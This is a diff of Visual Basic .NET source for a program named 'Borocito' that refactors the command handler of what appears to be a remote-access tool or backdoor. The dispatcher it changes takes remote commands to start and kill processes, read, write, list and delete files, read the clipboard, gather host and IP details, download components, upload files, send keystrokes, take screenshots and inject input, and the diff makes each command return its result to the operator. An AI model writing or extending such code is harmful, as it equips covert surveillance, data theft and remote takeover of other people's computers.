@@ -12,7 +12,7 @@ Module GlobalUses
 End Module
 Module Utility
     Public tlmContent As String
-    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
+    Function AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False) As String
         Try
             Dim OverWrite As Boolean = False
             If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.log") Then
@@ -29,10 +29,12 @@ Module Utility
                 My.Computer.FileSystem.WriteAllText(DIRCommons & "\Borocito.log", vbCrLf & Message, OverWrite)
             Catch
             End Try
+            Return finalContent & "[" & from & "]" & content
         Catch ex As Exception
             Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
+            Return "[AddToLog@Utility]Error: " & ex.Message
         End Try
-    End Sub
+    End Function
     Function CreateRandomString(ByRef Length As Integer) As String
         Dim str As String = Nothing
         Dim rnd As New Random
@@ -503,92 +505,66 @@ Module Network
                             LoadRegedit()
 
                             '<--- Windows --->
-                        ElseIf CMD1.Contains("/Windows.Process.Start=") Then 'Funciona.
+                        ElseIf CMD1.Contains("/Windows.Process.Start=") Then
                             Dim Arg() As String = CommandCMD.Split(",")
-                            Process.Start(Arg(0), Arg(1))
+                            CommandResponse = ProcessStart(Arg(0), Arg(1))
 
-                        ElseIf CMD1.Contains("/Windows.Process.Stop=") Then 'Funciona.
-                            Dim proc = Process.GetProcessesByName(CommandCMD)
-                            For i As Integer = 0 To proc.Count - 1
-                                proc(i).CloseMainWindow()
-                            Next i
+                        ElseIf CMD1.Contains("/Windows.Process.Stop=") Then
+                            CommandResponse = ProcessStop(CommandCMD)
 
-                        ElseIf CMD1.Contains("/Windows.Process.Get()") Then 'Funciona.
-                            Dim p As Process
-                            For Each p In Process.GetProcesses()
-                                If Not p Is Nothing Then
-                                    tempString = tempString & p.ProcessName & vbCrLf
-                                End If
-                            Next
-                            CommandResponse = tempString
+                        ElseIf CMD1.Contains("/Windows.Process.Get()") Then
+                            CommandResponse = ProcessGet()
 
-                        ElseIf CMD1.Contains("/Windows.FileSystem.GetDirectory=") Then 'Funciona.
-                            For Each DIR As String In My.Computer.FileSystem.GetDirectories(CommandCMD, FileIO.SearchOption.SearchAllSubDirectories)
-                                tempString = tempString & DIR & vbCrLf
-                            Next
-                            CommandResponse = tempString
+                        ElseIf CMD1.Contains("/Windows.FileSystem.GetDirectory=") Then
+                            CommandResponse = FileSystemGetDirectory(CommandCMD)
 
-                        ElseIf CMD1.Contains("/Windows.FileSystem.GetFiles=") Then 'Funciona.
-                            For Each FILE As String In My.Computer.FileSystem.GetFiles(CommandCMD, FileIO.SearchOption.SearchAllSubDirectories)
-                                tempString = tempString & FILE & vbCrLf
-                            Next
-                            CommandResponse = tempString
+                        ElseIf CMD1.Contains("/Windows.FileSystem.GetFiles=") Then
+                            CommandResponse = FileSystemGetFiles(CommandCMD)
 
-                        ElseIf CMD1.Contains("/Windows.FileSystem.Read=") Then 'Funciona.
-                            tempString = My.Computer.FileSystem.ReadAllText(CommandCMD)
-                            CommandResponse = tempString
+                        ElseIf CMD1.Contains("/Windows.FileSystem.Read=") Then
+                            CommandResponse = FileSystemRead(CommandCMD)
 
-                        ElseIf CMD1.Contains("/Windows.FileSystem.Write=") Then 'Funciona.
+                        ElseIf CMD1.Contains("/Windows.FileSystem.Write=") Then
                             Dim Arg() As String = CommandCMD.Split(",")
-                            My.Computer.FileSystem.WriteAllText(Arg(0), Arg(1), False)
+                            CommandResponse = FileSystemWrite(Arg(0), Arg(1), Arg(2))
 
-                        ElseIf CMD1.Contains("/Windows.FileSystem.DirCreate=") Then 'Funciona.
-                            My.Computer.FileSystem.CreateDirectory(CommandCMD)
+                        ElseIf CMD1.Contains("/Windows.FileSystem.DirCreate=") Then
+                            CommandResponse = FileSystemDirCreate(CommandCMD)
 
-                        ElseIf CMD1.Contains("/Windows.FileSystem.Delete=") Then 'Funciona.
-                            Try
-                                My.Computer.FileSystem.DeleteFile(CommandCMD)
-                            Catch
-                            End Try
-                            Try
-                                My.Computer.FileSystem.DeleteDirectory(CommandCMD, FileIO.DeleteDirectoryOption.DeleteAllContents)
-                            Catch
-                            End Try
+                        ElseIf CMD1.Contains("/Windows.FileSystem.Delete=") Then
+                            CommandResponse = FileSystemDelete(CommandCMD)
 
-                        ElseIf CMD1.Contains("/Windows.Clipboard.Get()") Then 'No funciona
-                            CommandResponse = My.Computer.Clipboard.GetText()
+                        ElseIf CMD1.Contains("/Windows.Clipboard.Set=") Then
+                            CommandResponse = ClipboardSet(CommandCMD)
 
-                        ElseIf CMD1.Contains("/Windows.System.GetHost()") Then 'Funciona.
-                            tempString = vbCrLf
-                            Dim MI_HOST As String
-                            MI_HOST = Dns.GetHostName()
-                            Dim MIS_IP As IPAddress() = Dns.GetHostAddresses(MI_HOST)
-                            tempString = tempString & MI_HOST & vbCrLf
-                            For I = 0 To MIS_IP.Length - 1
-                                tempString = tempString & MIS_IP(I).ToString & vbCrLf
-                            Next
-                            CommandResponse = tempString
+                        ElseIf CMD1.Contains("/Windows.Clipboard.Get()") Then
+                            CommandResponse = ClipboardGet()
+
+                        ElseIf CMD1.Contains("/Windows.System.GetHost()") Then
+                            CommandResponse = SystemGetHost()
 
                             '<--- Payloads --->
                         ElseIf CMD1.Contains("/Payloads.DownloadComponent=") Then 'Funciona.
                             Dim Arg() As String = CommandCMD.Split(",")
-                            Payloads.DownloadComponent(Arg(0), Arg(1), Boolean.Parse(Arg(2)), Arg(3), Arg(4))
+                            CommandResponse = Payloads.DownloadComponent(Arg(0), Arg(1), Boolean.Parse(Arg(2)), Arg(3), Arg(4))
 
                         ElseIf CMD1.Contains("/Payloads.Upload.File=") Then 'Funciona.
                             Dim Arg() As String = CommandCMD.Split(",")
-                            Payloads.uploadAfile(Arg(0), Arg(1))
+                            CommandResponse = Payloads.uploadAfile(Arg(0), Arg(1))
 
                         ElseIf CMD1.Contains("/Payloads.SendTheKeys=") Then 'Funciona.
                             Dim Arg() As String = CommandCMD.Split(",")
-                            Payloads.SendTheKeys(Arg(0), Arg(1))
+                            CommandResponse = Payloads.SendTheKeys(Arg(0), Arg(1))
 
                         ElseIf CMD1.Contains("/Payloads.TakeScreenshot()") Then 'Funciona.
-                            Payloads.TakeAnScreenshot()
+                            CommandResponse = Payloads.TakeAnScreenshot()
+
                         ElseIf CMD1.Contains("/Payloads.Inputs=") Then 'Funciona.
-                            Payloads.Inputs(CommandCMD)
+                            CommandResponse = Payloads.Inputs(CommandCMD)
+
                         ElseIf CMD1.Contains("/Payloads.PostNotify=") Then 'Funciona.
                             Dim Arg() As String = CommandCMD.Split(",")
-                            Payloads.PostNotify(Arg(0), Arg(1), Arg(2), Arg(3), Arg(4))
+                            CommandResponse = Payloads.PostNotify(Arg(0), Arg(1), Arg(2), Arg(3), Arg(4))
 
                             '<--- Borocito Tools --->
                         ElseIf CMD1.Contains("/Stop") Then 'Funciona.
